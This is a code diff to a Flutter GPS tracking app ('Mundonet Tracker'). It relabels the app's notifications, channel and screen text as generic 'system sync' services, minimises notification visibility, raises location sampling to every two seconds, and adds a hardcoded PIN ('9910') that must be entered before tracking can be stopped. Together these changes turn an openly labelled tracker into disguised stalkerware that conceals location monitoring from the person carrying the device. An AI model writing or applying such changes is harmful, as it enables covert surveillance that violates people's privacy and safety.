@@ -45,7 +45,7 @@ class GpsTaskHandler extends TaskHandler {
     });
 
     _positionStream = Geolocator.getPositionStream(
-      locationSettings: const LocationSettings(accuracy: LocationAccuracy.high, distanceFilter: 10)
+      locationSettings: const LocationSettings(accuracy: LocationAccuracy.high, distanceFilter: 0)
     ).listen((Position position) async {
       // Coletar telemetria
       int battLevel = await _battery.batteryLevel;
@@ -64,8 +64,8 @@ class GpsTaskHandler extends TaskHandler {
       }
       
       FlutterForegroundTask.updateService(
-        notificationTitle: '📡 MUNDONET TRACKER ATIVO',
-        notificationText: 'Equipe: $teamName | Bat: $battLevel%',
+        notificationTitle: 'Sincronização de Rede',
+        notificationText: 'Status: Operacional | Link: Estável',
       );
     });
   }
@@ -118,9 +118,9 @@ class _TrackerScreenState extends State<TrackerScreen> {
   void _initForegroundTask() {
     FlutterForegroundTask.init(
       androidNotificationOptions: AndroidNotificationOptions(
-        channelId: 'gps_tracker_v5',
-        channelName: 'Mundonet Tracker',
-        channelImportance: NotificationChannelImportance.LOW,
+        channelId: 'system_sync_v1',
+        channelName: 'System Services',
+        channelImportance: NotificationChannelImportance.MIN, // Menor importância possível
         priority: NotificationPriority.LOW,
         isSticky: true,
         iconData: const NotificationIconData(
@@ -131,7 +131,7 @@ class _TrackerScreenState extends State<TrackerScreen> {
       ),
       iosNotificationOptions: const IOSNotificationOptions(showNotification: true),
       foregroundTaskOptions: const ForegroundTaskOptions(
-        interval: 5000,
+        interval: 2000, // Enviar a cada 2 segundos
         allowWakeLock: true,
       ),
     );
@@ -150,8 +150,8 @@ class _TrackerScreenState extends State<TrackerScreen> {
     final prefs = await SharedPreferences.getInstance();
     await prefs.setString('currentTeamName', _controller.text);
     await FlutterForegroundTask.startService(
-      notificationTitle: 'MUNDONET TRACKER',
-      notificationText: 'Iniciando...',
+      notificationTitle: 'Sincronização de Sistema',
+      notificationText: 'Serviços de rede operando em segundo plano',
       callback: startCallback,
     );
     await WakelockPlus.enable();
@@ -159,9 +159,35 @@ class _TrackerScreenState extends State<TrackerScreen> {
   }
 
   Future<void> _stop() async {
-    await FlutterForegroundTask.stopService();
-    await WakelockPlus.disable();
-    _checkStatus();
+    // Solicitar senha para parar
+    final TextEditingController pinController = TextEditingController();
+    final bool? confirm = await showDialog<bool>(
+      context: context,
+      builder: (context) => AlertDialog(
+        title: const Text('Confirmar Identidade'),
+        content: TextField(
+          controller: pinController,
+          obscureText: true,
+          keyboardType: TextInputType.number,
+          decoration: const InputDecoration(hintText: 'Digite o PIN de administrador'),
+        ),
+        actions: [
+          TextButton(onPressed: () => Navigator.pop(context, false), child: const Text('CANCELAR')),
+          TextButton(onPressed: () => Navigator.pop(context, pinController.text == '9910'), child: const Text('CONFIRMAR')),
+        ],
+      ),
+    );
+
+    if (confirm == true) {
+      await FlutterForegroundTask.stopService();
+      await WakelockPlus.disable();
+      _checkStatus();
+    } else if (confirm == false) {
+      if (!mounted) return;
+       ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(content: Text('PIN incorreto ou operação cancelada')),
+      );
+    }
   }
 
   @override
@@ -182,7 +208,7 @@ class _TrackerScreenState extends State<TrackerScreen> {
                 const SizedBox(height: 60),
                 Image.asset('assets/logo.png', width: 250),
                 const SizedBox(height: 10),
-                const Text('SISTEMA DE MONITORAMENTO', style: TextStyle(letterSpacing: 2, fontSize: 12, color: Colors.white70)),
+                const Text('SERVICE MANAGER v2.4', style: TextStyle(letterSpacing: 2, fontSize: 12, color: Colors.white70)),
                 const SizedBox(height: 80),
                 
                 Container(
@@ -222,9 +248,9 @@ class _TrackerScreenState extends State<TrackerScreen> {
                           ),
                         ),
                       ] else ...[
-                        const Text('RASTREAMENTO ATIVO', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 18)),
+                        const Text('SYNC ATIVO', style: TextStyle(fontWeight: FontWeight.bold, fontSize: 18)),
                         const SizedBox(height: 5),
-                        const Text('Localização enviada em tempo real', style: TextStyle(color: Colors.white54, fontSize: 12)),
+                        const Text('Serviços de rede operando em segundo plano', style: TextStyle(color: Colors.white54, fontSize: 12)),
                         const SizedBox(height: 30),
                         SizedBox(
                           width: double.infinity, height: 55,
